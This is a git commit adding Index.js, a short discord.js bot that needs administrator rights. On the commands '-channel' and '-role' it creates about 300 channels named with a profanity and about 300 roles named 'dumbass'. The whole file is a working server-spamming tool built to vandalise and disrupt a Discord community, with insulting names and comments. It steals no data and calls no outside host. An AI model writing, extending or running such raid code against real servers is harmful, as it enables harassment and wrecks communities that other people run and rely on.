7bbd3d98cbb3b03013a5a27a1f3535c9ee05f1e5
t8nker <dafunky10@hotmail.com>
2019-07-04 16:06:43 -0700

    Create Index.js

---
+++ Index.js
@@ -0,0 +1,32 @@
+const { Client } = require('discord.js');
+const token = 'your_token_here';
+const client = new Client();
+const Prefix = '-'
+
+//Bot needs admin to work
+
+
+client.on('message', async msg => {
+  if (msg.content === Prefix + 'channel')
+  {
+    var i;
+    for ( i=0  ; i <= 300; i++) // makes 300 channels  named Get Fucked
+    {
+    var channel = await msg.guild.createChannel('Get Fucked');
+
+    }
+
+  }
+  if (msg.content === Prefix + 'role')
+  {
+
+    for ( i=0  ; i <= 300; i++) // makes 300 roles named dumbass
+    {
+
+    await msg.guild.createRole({name:'dumbass'}) //spam make roles
+
+  }
+}
+
+});
+client.login(token).catch(console.error);
